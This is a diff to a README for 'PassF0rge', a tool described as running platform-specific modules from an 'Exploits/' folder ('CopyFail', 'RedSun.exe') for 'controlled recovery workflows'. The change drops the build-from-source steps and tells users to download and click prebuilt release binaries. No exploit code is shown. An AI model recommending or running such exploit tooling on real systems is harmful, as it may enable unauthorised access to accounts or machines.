@@ -19,41 +19,28 @@ It provides a unified interface for running platform-specific recovery modules o
 ---
 ## 🧩 How It Works
 1. User provides username and password
-2. Tool sets environment variables:
-   - `USERNAME`
-   - `PASSWORD`
-3. Platform-specific module is executed:
+2. Platform-specific module is executed:
    - Linux: `./Exploits/Linux/CopyFail`
    - Windows: `Exploits\Windows\RedSun.exe`
-4. Module performs recovery workflow using provided environment context
+3. Module performs recovery workflow using provided environment context
 ---
-
-## 🛠️ Build Instructions
-### Linux
-```bash
-gcc main.c -o PassF0rge
-
-Windows (MSVC)
-
-cl main.c /Fe:PassF0rge.exe
-
-⸻
 
 ▶️ Usage
 
 Linux
 
-./PassF0rge username password
+Download and Extract the latest zip from [Releases](https://github.com/notthemystery/PassF0rge/releases) Tab.
+click on `passforge` file.
 
 Windows
 
-PassF0rge.exe username password
+Download and Extract the latest zip from [Releases](https://github.com/notthemystery/PassF0rge/releases) Tab.
+click on `PassF0rge` executable.
 
 ⸻
 
 🔐 Notes
 
-* Credentials are passed via environment variables only
 * Modules are executed locally depending on OS
 * Ensure required binaries exist in the Exploits/ directory
 * Designed for controlled recovery workflows only
